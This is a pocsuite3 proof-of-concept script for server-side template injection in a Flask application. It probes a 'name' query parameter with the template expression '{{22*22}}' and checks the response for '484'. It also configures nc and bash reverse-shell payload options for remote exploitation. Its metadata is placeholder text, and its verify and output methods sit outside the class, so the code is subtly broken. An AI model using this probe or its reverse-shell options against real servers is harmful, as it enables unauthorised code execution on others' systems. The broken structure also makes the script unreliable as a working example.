from collections import OrderedDict
from urllib.parse import urljoin
import re
from pocsuite3.api import POCBase, Output, register_poc, logger, requests, OptDict, VUL_TYPE
from pocsuite3.api import REVERSE_PAYLOAD, POC_CATEGORY


class FlaskPOC(POCBase):
    vulID = '1.1'  # ssvid ID，如果是提交漏洞的同时提交POC，则写成0
    version = '1.1'  # 默认为1
    author = ['1.1']  # POC作者的名字
    vulDate = '1.1'  # 漏洞公开的时间，不明确是可以写今天
    createDate = '1.1'  # 编写POC的日期
    updateDate = '1.1'  # POC更新的时间，默认和编写时间一样
    references = ['flask']  # 漏洞地址来源，0day不用写
    name = 'flask'  # POC名称
    appPowerLink = 'flask'  # 漏洞厂商的主页地址
    appName = 'flask'  # 漏洞应用名称
    appVersion = 'flask'  # 漏洞影响版本
    vulType = VUL_TYPE.CODE_EXECUTION  # 漏洞类型
    desc = '''				

    '''  # 漏洞简要描述
    samples = ['127.0.0.1:8000']  # 测试样例，使用POC测试成功的网站
    category = POC_CATEGORY.EXPLOITS.REMOTE

    def _options(self):
        o = OrderedDict()
        payload = {
            "nc": REVERSE_PAYLOAD.NC,
            "bash": REVERSE_PAYLOAD.BASH,
        }
        o["command"] = OptDict(selected="bash", default=payload)
        return o


def _verify(self):
    result = {}
    path = "?name="
    url = self.url + path
    # print(url)
    payload = "{{22*22}}"
    # print(payload)
    try:
        resq = requests.get(url + payload)
        if resq and resq.status_code == 200 and "484" in resq.text:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = url
            result['VerifyInfo']['Name'] = payload
    except Exception as e:
        return
    return self.parse_output(result)


def parse_output(self, result):
    output = Output(self)
    if result:
        output.success(result)
    else:
        output.fail('target is not vulnerable')
    return output


register_poc(FlaskPOC)
